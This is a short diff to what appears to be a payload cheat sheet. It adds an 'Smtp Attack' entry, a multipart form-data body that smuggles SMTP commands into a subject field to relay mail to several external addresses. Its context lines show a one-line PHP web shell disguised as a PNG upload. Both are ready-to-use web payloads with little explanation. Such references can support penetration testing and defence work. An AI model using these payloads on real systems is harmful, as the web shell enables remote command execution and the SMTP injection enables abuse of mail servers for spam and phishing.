@@ -61,6 +61,19 @@ Content-Type: image/png
 <?php system($_GET['cmd']); ?>
 ```
 
+Smtp Attack
 ```
-
+  -----------------------------134475172700422922879687252
+  Content-Disposition: form-data; name="subject"
+  Test
+  .
+  MAIL FROM: external@domain1.com
+  RCPT TO: external@domain1.com
+  RCPT TO: external@domain2.com
+  RCPT TO: external@domain3.com
+  RCPT TO: external@domain4.com
+  Data
+  This is an example of SMTP Injection attack
+  .
+  -----------------------------134475172700422922879687252
 ```
